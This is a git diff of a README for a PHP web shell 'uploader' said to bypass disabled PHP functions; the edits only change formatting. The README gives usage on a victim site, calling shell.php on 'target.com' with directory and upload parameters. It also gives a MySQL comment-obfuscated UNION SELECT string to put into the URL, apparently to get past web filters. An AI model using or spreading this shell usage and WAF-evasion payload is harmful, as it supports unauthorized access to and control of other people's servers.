@@ -1,7 +1,6 @@
 # **Uploader With Tools For Bypassing Disable Function**
 
-> This Uploader has been reCoded by me a.k.a Jakarta6etar
-just noob, and i want learn to be better
+`This Uploader has been reCoded by me a.k.a Jakarta6etar just noob, and i want learn to be better.`
 
 # Thank's To
 
@@ -26,6 +25,6 @@ just noob, and i want learn to be better
 #
 > https://www.target.com/shell.php?**dir=/home/target/public_html&do=upload**
 #
-> Inject With **/*!50000UNION*//*!50000SELECT*/** AFTER ?
+Inject With `**/*!50000UNION*//*!50000SELECT*/**` AFTER ?
 #
 > so, https://www.target.com/shell.php?**/*!50000UNION*//*!50000SELECT*/**dir=/home/target/public_html&do=upload
